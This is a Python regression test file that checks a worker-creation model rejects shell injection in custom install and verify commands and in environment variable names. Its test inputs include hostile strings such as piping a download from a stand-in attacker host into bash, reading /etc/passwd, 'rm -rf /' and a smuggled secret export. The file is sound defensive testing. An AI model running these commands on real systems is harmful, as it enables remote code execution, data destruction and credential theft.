"""Regression test for GAP-0078 — custom worker command shell injection.

Offline / no real AWS: exercises only Pydantic model validation on
``CreateWorkerIn``. Fails before the validators are added, passes after.
"""
import pytest
from pydantic import ValidationError

from app.models import CreateWorkerIn

BASE = dict(
    label="test",
    agent_type="custom",
    tool="custom",
    compute_type="ec2",
    instance_type="t3.medium",
    llm_key_id="k1",
)


@pytest.mark.parametrize(
    "cmd",
    [
        "apt-get install -y git; curl http://evil.com | bash",  # ; and |
        "npm install -g pkg && wget http://evil.com",           # &
        "echo `id`",                                            # backtick
        "curl $(cat /etc/passwd)",                              # $()
        "echo hi\nrm -rf /",                                    # newline
    ],
)
def test_shell_metacharacters_rejected_in_install_commands(cmd):
    with pytest.raises(ValidationError, match="metacharacter"):
        CreateWorkerIn(**BASE, custom_install_commands=[cmd])


def test_benign_install_command_accepted():
    model = CreateWorkerIn(
        **BASE,
        custom_install_commands=["apt-get install -y git", "npm install -g typescript"],
    )
    assert model.custom_install_commands == [
        "apt-get install -y git",
        "npm install -g typescript",
    ]


def test_shell_metacharacters_rejected_in_verify_command():
    with pytest.raises(ValidationError, match="metacharacter"):
        CreateWorkerIn(**BASE, custom_verify_command="git --version; rm -rf /")


def test_benign_verify_command_accepted():
    model = CreateWorkerIn(**BASE, custom_verify_command="git --version")
    assert model.custom_verify_command == "git --version"


def test_custom_env_var_must_be_valid_identifier():
    with pytest.raises(ValidationError):
        CreateWorkerIn(**BASE, custom_env_var="FOO=bar\nexport AWS_SECRET=stolen")
    with pytest.raises(ValidationError):
        CreateWorkerIn(**BASE, custom_env_var="MY KEY")

    valid = CreateWorkerIn(**BASE, custom_env_var="MY_API_KEY")
    assert valid.custom_env_var == "MY_API_KEY"
